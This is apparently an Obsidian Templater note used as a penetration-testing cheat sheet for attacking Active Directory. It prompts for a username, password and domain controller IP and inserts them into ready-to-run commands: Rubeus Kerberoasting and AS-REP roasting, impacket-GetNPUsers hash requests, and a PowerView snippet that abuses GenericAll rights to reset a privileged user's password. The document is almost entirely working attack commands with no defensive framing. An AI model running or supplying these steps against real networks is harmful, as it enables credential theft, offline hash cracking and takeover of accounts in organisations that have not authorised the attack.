<%*
let Name = await tp.system.prompt("Enter user name with credentials")
let Pass = await tp.system.prompt("Enter the user's password with credentials")
let IP = await tp.system.prompt("Enter the IP of the DC")
-%>

- kerberoast

```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

- asreproast

```
.\Rubeus.exe asreproast /outfile:hashes.asreproast
```

- AS-REP Roasting

```
impacket-GetNPUsers -dc-ip <% IP %>  -request -outputfile hashes.f <% tp.frontmatter["DOMAIN"] %>/<% Name %>
```


> [!Warning] If the above does not work (GenericAll)
> Try changing the password of a privileged user.
> You need to download PowerView.ps1 to use it. *Set-DomainUserPassword*
>
>```powershell
>$SecPassword = ConvertTo-SecureString '<% Pass %>' -AsPlainText -Force
>$Cred = New-Object System.Management.Automation.PSCredential('<% tp.frontmatter["DOMAIN"] %>\<% Name %>', $SecPassword)
>$UserPassword = ConvertTo-SecureString 'PasswordInventada' -AsPlainText -Force
>Set-DomainUserPassword -Identity UserAbuse -AccountPassword $UserPassword -Credential $Cred
